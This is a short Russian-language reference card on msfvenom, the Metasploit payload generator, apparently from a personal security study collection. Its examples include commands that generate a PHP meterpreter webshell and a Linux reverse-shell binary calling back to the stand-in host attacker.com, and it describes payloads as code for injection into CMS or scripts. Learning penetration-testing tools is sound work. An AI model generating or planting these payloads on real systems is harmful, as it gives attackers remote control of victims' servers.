# msfvenom

## Описание
Инструмент Metasploit Framework для генерации payload (кода для эксплуатации) различных типов для внедрения в CMS или скрипты.

## Уровень
Продвинутый

## Примеры использования
- Генерация PHP webshell: `msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw`
- Генерация reverse shell: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f elf`
- Список payload: `msfvenom --list payloads`

## Ресурсы для изучения
- [Metasploit Documentation](https://docs.metasploit.com/)
- Payload generation руководства

## Заметки
(Добавляйте свои заметки, примеры кода или ссылки на видео.)

